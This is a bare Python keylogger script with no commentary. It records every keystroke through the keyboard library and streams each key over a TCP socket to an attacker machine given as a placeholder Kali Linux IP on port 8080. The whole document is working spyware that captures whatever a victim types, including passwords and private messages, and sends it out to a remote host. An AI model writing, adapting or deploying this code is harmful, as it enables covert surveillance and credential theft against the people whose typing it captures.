import socket
import time
import keyboard

IP = '[Kali Linux IP Address]'
PORT = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

def write_to_socket(key):
    s.send(key.encode())

while True:
    try:
        key = keyboard.read_key()
        if key:
            write_to_socket(key)
            time.sleep(0.1)
    except keyboard.KeyboardInterrupt:
        break
